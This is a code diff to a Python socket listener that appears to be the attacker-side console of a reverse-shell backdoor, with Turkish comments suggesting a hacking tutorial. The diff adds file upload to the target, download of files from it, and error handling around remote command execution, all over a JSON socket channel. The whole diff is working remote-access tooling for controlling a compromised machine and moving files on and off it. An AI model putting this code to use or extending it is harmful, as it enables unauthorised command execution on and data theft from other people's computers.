@@ -1,6 +1,7 @@
 import socket
 import json
 import base64
+import simplejson
 
 class SocketListener:
     def __init__(self, ip, port):
@@ -19,14 +20,14 @@ class SocketListener:
         print("Connection OK! from {}".format(str(my_address)))
 
     def json_send(self,data):
-        json_data = json.dumps(data)
-        self.my_connection.send(json_data)
+        json_data = simplejson.dumps(data)
+        self.my_connection.send(json_data.encode("utf-8"))
     def json_receive(self):
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.my_connection.recv(1024)
-                return json.loads(json_data)
+                json_data = json_data + self.my_connection.recv(1024).decode()
+                return simplejson.loads(json_data)
             except ValueError:
                 continue
     def command_execution(self,command_input):
@@ -41,13 +42,23 @@ class SocketListener:
         with open(path,"wb") as file: # wb -> write binary
             file.write(base64.b64decode(content)) # indirirken dosyayı decrypt ediyoruz
             return "Download OK!"
+    def get_file_content(self,path):
+        with open(path,"rb") as file:
+            return base64.b64encode(file.read())
+
     def start_listener(self):
         while True:
             command_input = input("Enter command:")
             command_input = command_input.split(" ") # aradaki boşluklara göre stringi parçalar
-            command_output = self.command_execution(command_input)
-            if command_input[0] == "download":
-                command_output = self.save_file(command_input[1],command_output)
+            try:
+                if command_input[0]=="upload":
+                    file_content = self.get_file_content(command_input[1])
+                    command_input.append(file_content)
+                command_output = self.command_execution(command_input)
+                if command_input[0] == "download" and "Error!" not in command_output:
+                    command_output = self.save_file(command_input[1],command_output)
+            except Exception:
+                command_output = "Error!"
             print(command_output)
 
 
